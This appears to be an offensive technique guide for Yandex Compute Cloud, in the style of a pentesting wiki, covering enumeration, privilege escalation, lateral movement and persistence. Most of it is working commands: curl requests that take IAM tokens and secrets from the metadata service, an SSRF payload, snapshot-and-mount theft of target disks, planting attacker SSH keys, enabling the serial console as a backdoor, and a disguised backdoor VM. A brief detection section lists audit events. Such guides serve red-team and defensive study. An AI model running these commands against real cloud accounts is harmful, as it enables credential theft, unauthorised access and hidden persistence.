# Yandex Cloud - Compute Techniques

## Service Overview

Yandex Compute Cloud provides virtual machines, instance groups, disks, snapshots, and images. VMs are created within folders and inherit IAM permissions from the folder hierarchy. Every VM has access to a metadata service (IMDS) at `169.254.169.254` that provides instance information and, critically, IAM tokens for linked service accounts. The service supports serial console access, OS Login (IAM-integrated SSH), and GPU clusters.

**Key Concepts:**
- **Resource Hierarchy**: VMs live in folders, inherit folder IAM bindings
- **Metadata Service (IMDS)**: Available without auth at `http://169.254.169.254` inside every VM
- **Service Account Linking**: VMs can have a SA linked, making IAM tokens available via IMDS
- **Serial Console**: Network-independent VM access via SSH on port 9600 (disabled by default)
- **OS Login**: IAM-integrated SSH using short-lived certificates (1-hour validity)
- **Instance Groups**: Managed VM sets that require a service account with `compute.editor`

---

## Enumeration

### Enumerate VMs

```bash
# List all VMs in the default folder
yc compute instance list

# List VMs in a specific folder
yc compute instance list --folder-id <folder_id>

# Get detailed VM info (service account, network, metadata)
yc compute instance get <vm_id>
yc compute instance get <vm_id> --format json

# Get serial port output (may contain boot logs, credentials)
yc compute instance get-serial-port-output <vm_id>

# List VMs with their linked service accounts
yc compute instance list --format json | jq '.[] | {name, id, service_account_id}'
```

### Enumerate Disks, Snapshots, Images

```bash
# List disks
yc compute disk list

# List snapshots
yc compute snapshot list

# List images
yc compute image list

# Get latest image from a family
yc compute image get-latest-from-family --folder-id <folder_id> --family <family>

# List snapshot schedules
yc compute snapshot-schedule list
```

### Enumerate Instance Groups

```bash
# List instance groups
yc compute instance-group list

# Get instance group details (shows SA ID)
yc compute instance-group get <group_id>

# List VMs in a group
yc compute instance-group list-instances <group_id>

# List access bindings
yc compute instance-group list-access-bindings <group_id>
```

### Enumerate GPU Clusters and Placement Groups

```bash
yc compute gpu-cluster list
yc compute gpu-cluster list-instances <cluster_id>
yc compute placement-group list
yc compute placement-group list-instances <pg_id>
yc compute host-group list
```

### Enumerate Access Bindings

```bash
yc compute instance list-access-bindings <vm_id>
yc compute disk list-access-bindings <disk_id>
yc compute instance-group list-access-bindings <group_id>
```

### API-Based Enumeration

```bash
# List instances via REST API
curl -s -H "Authorization: Bearer <IAM_TOKEN>" \
  "https://compute.api.cloud.yandex.net/compute/v1/instances?folderId=<folder_id>"

# Get serial port output
curl -s -H "Authorization: Bearer <IAM_TOKEN>" \
  "https://compute.api.cloud.yandex.net/compute/v1/instances/<instance_id>:serialPortOutput"
```

---

## Credential Access

### Steal IAM Token from Metadata Service (IMDS)

The primary credential theft technique. Any process on a VM with a linked service account can obtain IAM tokens without authentication:

```bash
# Get IAM token from metadata service
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
# Returns: {"access_token":"CggVAgAAA...","expires_in":39944,"token_type":"Bearer"}

# Use the stolen token
TOKEN=$(curl -sf -H "Metadata-Flavor:Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token \
  | jq -r .access_token)

curl -H "Authorization: Bearer $TOKEN" \
  "https://compute.api.cloud.yandex.net/compute/v1/instances?folderId=$FOLDER_ID"
```

**IMDS Configuration**: The `gce-http-token` metadata option can disable token retrieval, but it is **enabled by default**.

### Steal IAM Token via SSRF

If an application running on a Yandex Cloud VM has an SSRF vulnerability, it can be used to reach the metadata service:

```
# SSRF payload to steal IAM token
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Requires the Metadata-Flavor: Google header — some SSRF vectors allow header injection
```

### Harvest Metadata for Secrets

All metadata is **unencrypted**. The `user-data` field commonly contains sensitive information:

```bash
# Get user-data (cloud-init scripts, may contain passwords, keys)
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/latest/user-data"

# Get SSH keys from metadata
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/attributes/ssh-keys"

# Get cloud and folder IDs for further enumeration
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/vendor/cloud-id"
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/vendor/folder-id"

# Get all network interfaces (internal/external IPs)
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/network-interfaces/?recursive=true"

# Get all disks
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/disks/?recursive=true"

# Get VM identity document
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/vendor/identity/document"
```

**Common secrets in user-data:**
- SSH keys with `NOPASSWD:ALL` sudo
- Lockbox secret IDs (retrievable with the SA token)
- Windows admin passwords in PowerShell scripts
- Database connection strings
- API keys and tokens

### Extract Credentials from Disk Snapshots

Create a snapshot of a target VM's disk, then mount it on an attacker-controlled VM for offline analysis:

```bash
# Create snapshot of target disk
yc compute snapshot create --name exfil-snap --disk-id <target_disk_id>

# Create a new disk from the snapshot
yc compute disk create --name exfil-disk --source-snapshot-name exfil-snap

# Attach to attacker VM
yc compute instance attach-disk <attacker_vm_id> --disk-name exfil-disk --auto-delete=false

# Mount and search for credentials on the attacker VM
mount /dev/vdb1 /mnt
grep -r "password\|secret\|key\|token" /mnt/etc/ /mnt/home/ /mnt/root/
```

---

## Privilege Escalation

### OS Login Admin Access

The `compute.osAdminLogin` role grants **sudo/admin access** to all VMs with OS Login enabled in the role's scope:

```bash
# Connect with admin/sudo access
yc compute ssh --name <vm_name>
# User gets sudo privileges on the VM
```

**Risk**: If `compute.osAdminLogin` is assigned at the folder or cloud level, the user gets root on every OS Login-enabled VM.

### Service Account Chaining via Instance Groups

Instance groups require a service account with `compute.editor` on the folder. Compromising this SA gives management of all VMs in the folder:

```bash
# Identify the instance group SA
yc compute instance-group get <group_id> --format json | jq -r '.service_account_id'

# If you can impersonate this SA or create keys for it:
yc iam key create --service-account-id <ig_sa_id> --output ig-key.json
```

### Escalate via Metadata Modification

With `compute.editor`, you can add SSH keys or enable serial console on any VM:

```bash
# Add your SSH key to a target VM
yc compute instance add-metadata --name <vm_name> \
  --metadata-from-file ssh-keys=my-sshkeys.txt

# Enable serial console
yc compute instance add-metadata --name <vm_name> \
  --metadata serial-port-enable=1

# Enable OS Login (if you have osAdminLogin at folder level)
yc compute instance update --name <vm_name> --metadata enable-oslogin=true
```

### VM Folder Movement

VMs can be moved to a different folder with `compute.editor`, potentially placing them under weaker IAM policies:

```bash
yc compute instance move <vm_id> --destination-folder-id <attacker_folder_id>
```

### Attach Public IP to Internal VM

Expose an internal VM to the internet:

```bash
yc compute instance add-one-to-one-nat \
  --id <vm_id> \
  --network-interface-index 0
```

---

## Lateral Movement

### Pivot via Linked Service Accounts

VMs with linked SAs provide access to all resources the SA can reach:

```bash
# From compromised VM, get token and enumerate what it can access
TOKEN=$(curl -sf -H "Metadata-Flavor:Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token \
  | jq -r .access_token)

# List VMs in other folders (if SA has cross-folder access)
curl -H "Authorization: Bearer $TOKEN" \
  "https://compute.api.cloud.yandex.net/compute/v1/instances?folderId=<other_folder_id>"

# Access Object Storage
curl -H "Authorization: Bearer $TOKEN" \
  "https://storage.yandexcloud.net/<bucket>"

# Access Lockbox secrets
curl -H "Authorization: Bearer $TOKEN" \
  "https://payload.lockbox.api.cloud.yandex.net/lockbox/v1/secrets/<secret_id>/payload"
```

### Serial Console Access (Network-Independent)

Serial console provides VM access regardless of network state or firewall rules:

```bash
# Connect via CLI
yc compute connect-to-serial-port --instance-name <vm_name> --ssh-key ~/.ssh/id_ed25519

# Connect via raw SSH (port 9600)
ssh -t -p 9600 -o IdentitiesOnly=yes -i ~/.ssh/id_ed25519 \
  <vm_id>.<username>@serialssh.cloud.yandex.net
```

### Cross-VM Access via Shared Networks

VMs in the same VPC network can communicate using internal FQDNs:
```
<vm_name>.<region>.internal
```

---

## Persistence

### Add SSH Keys via Metadata

```bash
# Add persistent SSH key to a target VM (requires compute.editor)
yc compute instance add-metadata --name <vm_name> \
  --metadata-from-file ssh-keys=attacker-keys.txt
```

### Enable Serial Console as Backdoor

Serial console provides network-independent persistent access:

```bash
yc compute instance add-metadata --name <vm_name> \
  --metadata serial-port-enable=1 \
  --metadata-from-file ssh-keys=attacker-keys.txt
```

**Detection Note**: The docs explicitly warn serial console is a security risk. Serial console access is logged as `ConnectSerialPort` in Audit Trail.

### Link High-Privilege SA to Compromised VM

If a high-privilege SA is linked to a VM you control, IAM tokens are automatically available via IMDS:

```bash
# Requires compute.editor on VM + iam.serviceAccounts.user on the SA
# Done via API: Instance.Update with serviceAccountId field
```

### Create Backdoor VM with SA

```bash
# Create a VM with a linked service account
yc compute instance create \
  --name monitoring-agent \
  --zone ru-central1-a \
  --network-interface subnet-name=<subnet>,nat-ip-version=ipv4 \
  --create-boot-disk image-folder-id=standard-images,image-family=ubuntu-2204-lts \
  --service-account-id <high_priv_sa_id> \
  --ssh-key ~/.ssh/id_ed25519.pub
```

### Snapshot-Based Persistence

Create snapshots of target disks for later data extraction:

```bash
# Create snapshot schedule for continuous access
yc compute snapshot-schedule create \
  --name backup-schedule \
  --expression "0 0 * * *" \
  --snapshot-count 3 \
  --disk-id <target_disk_id>
```

### Windows Password Reset Agent

On Windows VMs, the password reset agent can create new admin users:

```bash
# The agent creates a new user with admin access if the username doesn't exist
# Agent logs are available on serial port 4 (COM4)
```

---

## Post-Exploitation

### Full Metadata Service Dump

```bash
# Comprehensive metadata dump from inside a VM
for path in \
  instance/id instance/name instance/hostname instance/zone instance/description \
  instance/service-accounts/default/token \
  instance/vendor/cloud-id instance/vendor/folder-id instance/vendor/environment \
  instance/vendor/identity/document \
  instance/attributes/ssh-keys instance/attributes/serial-port-enable \
  instance/attributes/enable-oslogin \
  instance/network-interfaces/?recursive=true \
  instance/disks/?recursive=true; do
  echo "=== $path ==="
  curl -sf -H "Metadata-Flavor:Google" \
    "http://169.254.169.254/computeMetadata/v1/$path" 2>/dev/null
  echo
done

# Get user-data
curl -sf -H "Metadata-Flavor:Google" "http://169.254.169.254/latest/user-data"
```

### Enumerate All VMs and Their Service Accounts

```bash
# Map VMs to their linked SAs across all folders
for folder in $(yc resource-manager folder list --cloud-id <cloud_id> --format json | jq -r '.[].id'); do
  echo "=== Folder: $folder ==="
  yc compute instance list --folder-id "$folder" --format json | \
    jq '.[] | {name, id, service_account_id, network_interfaces: [.network_interfaces[]? | {internal_ip: .primary_v4_address.address, external_ip: .primary_v4_address.one_to_one_nat.address}]}'
done
```

### Offline Disk Analysis

```bash
# Snapshot → Disk → Mount workflow
yc compute snapshot create --name forensic --disk-id <disk_id>
yc compute disk create --name forensic-disk --source-snapshot-name forensic
yc compute instance attach-disk <your_vm_id> --disk-name forensic-disk
# On your VM: mount /dev/vdb1 /mnt && search for credentials
```

---

## Key IMDS Paths Reference

| Path | Data | Security Impact |
|---|---|---|
| `instance/service-accounts/default/token` | IAM token JSON | **Critical: SA credential theft** |
| `instance/vendor/cloud-id` | Cloud ID | Scope identification |
| `instance/vendor/folder-id` | Folder ID | Scope identification |
| `instance/network-interfaces/?recursive=true` | All IPs (internal + external) | Network recon |
| `instance/attributes/ssh-keys` | SSH public keys | User enumeration |
| `instance/attributes/serial-port-enable` | Serial console status | Backdoor detection |
| `instance/attributes/enable-oslogin` | OS Login status | Access method identification |
| `instance/vendor/identity/document` | VM identity (instanceId, imageId) | VM fingerprinting |
| `/latest/user-data` | Cloud-init / user scripts | **Often contains secrets** |

---

## Key IAM Roles

| Role | What it Enables |
|---|---|
| `compute.viewer` | View VMs, disks, images, serial port output |
| `compute.editor` | Create/modify/delete VMs, disks, snapshots; modify metadata; link SAs; attach public IPs |
| `compute.admin` | Full control + manage access bindings |
| `compute.operator` | Start/stop/restart VMs |
| `compute.osLogin` | SSH access via OS Login (regular user) |
| `compute.osAdminLogin` | SSH access via OS Login with **sudo** |
| `compute.disks.user` | Use disks (attach to VMs) |
| `compute.images.user` | Use images (create VMs from them) |
| `compute.snapshotSchedules.editor` | Manage snapshot schedules |

---

## Detection and Logging

### Audit Trail Events

- `CreateInstance` / `DeleteInstance` — VM lifecycle
- `UpdateInstanceMetadata` — metadata changes (SSH key additions, serial console enable)
- `ConnectSerialPort` — serial console access
- `CreateSnapshot` — disk snapshotting
- `AttachInstanceDisk` / `DetachInstanceDisk` — disk operations
- `AddInstanceOneToOneNat` / `RemoveInstanceOneToOneNat` — public IP changes
- `MoveInstance` — VM folder moves
- `UpdateInstance` — service account linking, OS Login changes

### IMDS Access Detection

IMDS access (`169.254.169.254`) is not logged by Yandex Cloud Audit Trails. Detection must rely on host-based monitoring (process tracking, network flow logs).

---

## References

- Compute Documentation: `en/compute/`
- Metadata Service: `en/compute/concepts/vm-metadata.md`
- Serial Console: `en/compute/operations/serial-console/`
- OS Login: `en/compute/operations/vm-connect/os-login.md`
- Security Roles: `en/compute/security/index.md`
- Instance Groups: `en/compute/concepts/instance-groups/`
